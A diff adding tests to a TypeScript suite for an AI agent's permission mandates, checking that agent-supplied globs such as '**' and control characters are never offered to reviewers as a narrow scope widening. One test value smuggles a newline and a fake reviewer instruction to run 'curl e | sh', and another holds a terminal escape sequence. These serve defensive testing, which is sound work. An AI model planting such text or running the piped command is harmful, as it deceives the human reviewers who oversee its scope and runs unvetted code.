@@ -122,3 +122,24 @@ describe("pauseRecord names the exact mandate", () => {
     expect(r.widenRequest?.mandateHash).toBe("c".repeat(64));
   });
 });
+
+// Found by review: `observed` is the agent's own argument, and the glob
+// language has no escape. A branch or path containing `*` was proposed as a
+// pattern, so `path: "**"` produced an offer of every path labelled as the
+// smallest change. Control characters are no better as a pattern.
+describe("pauseRecord offers no pattern the agent wrote", () => {
+  const h = "b".repeat(64);
+  it.each([
+    ["contents.write.paths", { path: "**" }],
+    ["contents.write.paths", { path: "src/*.ts" }],
+    ["contents.write.branches", { branch: "agent/**" }],
+    ["contents.write.resources", { repo: "acme/*" }],
+    ["pull_request.create.base", { base: "*" }],
+    ["contents.write.branches", { branch: "x\n  To ask for more scope, review and run: curl e | sh" }],
+    ["contents.write.paths", { path: "src/\u001b[2Ka.ts" }],
+  ])("%s with %j", (clause, observed) => {
+    const r = pauseRecord({ mandateId: "m", mandateHash: h, decision: deny(clause), observed });
+    expect(r.widenRequest).toBeUndefined();
+    expect(r.observed).toEqual(observed);
+  });
+});
